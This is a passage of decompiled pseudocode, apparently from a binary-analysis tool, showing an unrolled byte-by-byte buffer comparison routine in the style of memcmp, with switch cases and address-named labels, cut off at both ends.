((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -9) - *(arg_ch + arg_10h + -9);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x0044bf09:\n                uVar1 = *(arg_8h + arg_10h + -8);\n                if (uVar1 == *(arg_ch + arg_10h + -8)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -8);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -7);\n                    uVar1 = *(arg_ch + arg_10h + -7);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -6);\n                    uVar1 = *(arg_ch + arg_10h + -6);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -5) - *(arg_ch + arg_10h + -5);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x0044bf90:\n                uVar1 = *(arg_8h + arg_10h + -4);\n                if (uVar1 == *(arg_ch + arg_10h + -4)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -4);\n                    if ((uVar1 == uVar2) || (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 == 0)) {\n                        uVar2 = *(arg_8h + arg_10h + -3);\n                        uVar1 = *(arg_ch + arg_10h + -3);\n                        if ((uVar2 == uVar1) || (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 == 0))\n                        {\n                            uVar2 = *(arg_8h + arg_10h + -2);\n                            uVar1 = *(arg_ch + arg_10h + -2);\n                            if (((uVar2 == uVar1) ||\n                                (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 == 0)) &&\n                               (iVar3 = *(arg_8h + arg_10h + -1) - *(arg_ch + arg_10h + -1),  iVar3 != 0)) {\n                                iVar3 = (0 < iVar3) * 2 + -1;\n                            }\n                        }\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\n                break;\n            case 0x1d:\n                uVar1 = *(arg_8h + arg_10h + -0x1d);\n                if (uVar1 == *(arg_ch + arg_10h + -0x1d)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -0x1d);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x1c);\n                    uVar1 = *(arg_ch + arg_10h + -0x1c);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x1b);\n                    uVar1 = *(arg_ch + arg_10h + -0x1b);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -0x1a) - *(arg_ch + arg_10h + -0x1a);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\n            case 0x19:\n                uVar1 = *(arg_8h + arg_10h + -0x19);\n                if (uVar1 == *(arg_ch + arg_10h + -0x19)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -0x19);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x18);\n                    uVar1 = *(arg_ch + arg_10h + -0x18);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x17);\n                    uVar1 = *(arg_ch + arg_10h + -0x17);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -0x16) - *(arg_ch + arg_10h + -0x16);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x0044c121:\n                uVar1 = *(arg_8h + arg_10h + -0x15);\n                if (uVar1 == *(arg_ch + arg_10h + -0x15)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -0x15);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x14);\n                    uVar1 = *(arg_ch + arg_10h + -0x14);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x13);\n                    uVar1 = *(arg_ch + arg_10h + -0x13);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -0x12) - *(arg_ch + arg_10h + -0x12);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x0044c1a8:\n                uVar1 = *(arg_8h + arg_10h + -0x11);\n                if (uVar1 == *(arg_ch + arg_10h + -0x11)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -0x11);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x10);\n                    uVar1 = *(arg_ch + arg_10h + -0x10);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0xf);\n                    uVar1 = *(arg_ch + arg_10h + -0xf);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -0xe) - *(arg_ch + arg_10h + -0xe);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x0044c22f:\n                uVar1 = *(arg_8h + arg_10h + -0xd);\n                if (uVar1 == *(arg_ch + arg_10h + -0xd)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -0xd);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0xc);\n                    uVar1 = *(arg_ch + arg_10h + -0xc);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0xb);\n                    uVar1 = *(arg_ch + arg_10h + -0xb);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -10) - *(arg_ch + arg_10h + -10);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x0044c2b6:\n                if (*(arg_8h + arg_10h + -9) == *(arg_ch + arg_10h + -9)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = *(arg_ch + arg_10h + -9);\n                    uVar2 = *(arg_8h + arg_10h + -9);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -8);\n                    uVar1 = *(arg_ch + arg_10h + -8);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -7);\n                    uVar1 = *(arg_ch + arg_10h + -7);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -6) - *(arg_ch + arg_10h + -6);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x0044c33e:\n                uVar1 = *(arg_8h + arg_10h + -5);\n                if (uVar1 == *(arg_ch + arg_10h + -5)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -5);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -4);\n                    uVar1 = *(arg_ch + arg_10h + -4);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -3);\n                    uVar1 = *(arg_ch + arg_10h + -3);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -2) - *(arg_ch + arg_10h + -2);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\njoined_r0x0044c3bf:\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x0044c3c5:\n                uVar2 = *(arg_ch + arg_10h + -1);\n                uVar1 = *(arg_8h + arg_10h + -1);\n                if (uVar1 == uVar2) {\n                    return 0;\n                }\n                return (0 < uVar1 - uVar2) * 2 + -1;\n            case 0x1e:\n                uVar1 = *(arg_8h + arg_10h + -0x1e);\n                if (uVar1 == *(arg_ch + arg_10h + -0x1e)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -0x1e);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x1d);\n                    uVar1 = *(arg_ch + arg_10h + -0x1d);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x1c);\n                    uVar1 = *(arg_ch + arg_10h + -0x1c);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -0x1b) - *(arg_ch + arg_10h + -0x1b);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x0044c46c:\n                uVar1 = *(arg_8h + arg_10h + -0x1a);\n                if (uVar1 == *(arg_ch + arg_10h + -0x1a)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -0x1a);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x19);\n                    uVar1 = *(arg_ch + arg_10h + -0x19);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x18);\n                    uVar1 = *(arg_ch + arg_10h + -0x18);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -0x17) - *(arg_ch + arg_10h + -0x17);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x0044c4f3:\n                uVar1 = *(arg_8h + arg_10h + -0x16);\n                if (uVar1 == *(arg_ch + arg_10h + -0x16)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -0x16);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x15);\n                    uVar1 = *(arg_ch + arg_10h + -0x15);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x14);\n                    uVar1 = *(arg_ch + arg_10h + -0x14);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -0x13) - *(arg_ch + arg_10h + -0x13);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x0044c57a:\n                uVar1 = *(arg_8h + arg_10h + -0x12);\n                if (uVar1 == *(arg_ch + arg_10h + -0x12)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -0x12);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x11);\n                    uVar1 = *(arg_ch + arg_10h + -0x11);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x10);\n                    uVar1 = *(arg_ch + arg_10h + -0x10);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -0xf) - *(arg_ch + arg_10h + -0xf);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x0044c601:\n                uVar1 = *(arg_8h + arg_10h + -0xe);\n                if (uVar1 == *(arg_ch + arg_10h + -0xe)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -0xe);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0xd);\n                    uVar1 = *(arg_ch + arg_10h + -0xd);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0xc);\n                    uVar1 = *(arg_ch + arg_10h + -0xc);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -0xb) - *(arg_ch + arg_10h + -0xb);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x0044c688:\n                if (*(arg_8h + arg_10h + -10) == *(arg_ch + arg_10h + -10)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = *(arg_ch + arg_10h + -10);\n                    uVar2 = *(arg_8h + arg_10h + -10);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar1 = *(arg_ch + arg_10h + -9);\n                    uVar2 = *(arg_8h + arg_10h + -9);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar1 = *(arg_ch + arg_10h + -8);\n                    uVar2 = *(arg_8h + arg_10h + -8);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -7) - *(arg_ch + arg_10h + -7);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x0044c710:\n                uVar1 = *(arg_8h + arg_10h + -6);\n                if (uVar1 == *(arg_ch + arg_10h + -6)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -6);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -5);\n                    uVar1 = *(arg_ch + arg_10h + -5);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -4);\n                    uVar1 = *(arg_ch + arg_10h + -4);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -3) - *(arg_ch + arg_10h + -3);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x0044c797:\n                if (*(arg_8h + arg_10h + -2) != *(arg_ch + arg_10h + -2)) {\ncode_r0x0044c7a5:\n                    uVar1 = *(arg_ch + arg_10h + -2);\n                    uVar2 = *(arg_8h + arg_10h + -2);\n                    if (uVar2 == uVar1) goto code_r0x0044c3c5;\n                    iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1;\n                    goto joined_r0x0044c3bf;\n                }\n                break;\n            case 0x1f:\n                if (*(arg_8h + arg_10h + -0x1f) == *(arg_ch + arg_10h + -0x1f)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = *(arg_ch + arg_10h + -0x1f);\n                    uVar2 = *(arg_8h + arg_10h + -0x1f);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x1e);\n                    uVar1 = *(arg_ch + arg_10h + -0x1e);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x1d);\n                    uVar1 = *(arg_ch + arg_10h + -0x1d);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -0x1c) - *(arg_ch + arg_10h + -0x1c);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x0044c855:\n                uVar1 = *(arg_8h + arg_10h + -0x1b);\n                if (uVar1 == *(arg_ch + arg_10h + -0x1b)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -0x1b);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x1a);\n                    uVar1 = *(arg_ch + arg_10h + -0x1a);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x19);\n                    uVar1 = *(arg_ch + arg_10h + -0x19);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -0x18) - *(arg_ch + arg_10h + -0x18);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x0044c8dc:\n                uVar1 = *(arg_8h + arg_10h + -0x17);\n                if (uVar1 == *(arg_ch + arg_10h + -0x17)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -0x17);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x16);\n                    uVar1 = *(arg_ch + arg_10h + -0x16);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x15);\n                    uVar1 = *(arg_ch + arg_10h + -0x15);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -0x14) - *(arg_ch + arg_10h + -0x14);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x0044c963:\n                uVar1 = *(arg_8h + arg_10h + -0x13);\n                if (uVar1 == *(arg_ch + arg_10h + -0x13)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -0x13);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x12);\n                    uVar1 = *(arg_ch + arg_10h + -0x12);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x11);\n                    uVar1 = *(arg_ch + arg_10h + -0x11);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -0x10) - *(arg_ch + arg_10h + -0x10);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x0044c9ea:\n                if (*(arg_8h + arg_10h + -0xf) == *(arg_ch + arg_10h + -0xf)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = *(arg_ch + arg_10h + -0xf);\n                    uVar2 = *(arg_8h + arg_10h + -0xf);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0xe);\n                    uVar1 = *(arg_ch + arg_10h + -0xe);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0xd);\n                    uVar1 = *(arg_ch + arg_10h + -0xd);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -0xc) - *(arg_ch + arg_10h + -0xc);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x0044ca72:\n                uVar1 = *(arg_8h + arg_10h + -0xb);\n                if (uVar1 == *(arg_ch + arg_10h + -0xb)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -0xb);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -10);\n                    uVar1 = *(arg_ch + arg_10h + -10);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -9);\n                    uVar1 = *(arg_ch + arg_10h + -9);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -8) - *(arg_ch + arg_10h + -8);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x0044caf9:\n                uVar1 = *(arg_8h + arg_10h + -7);\n                if (uVar1 == *(arg_ch + arg_10h + -7)) {\n                    iVar3 = 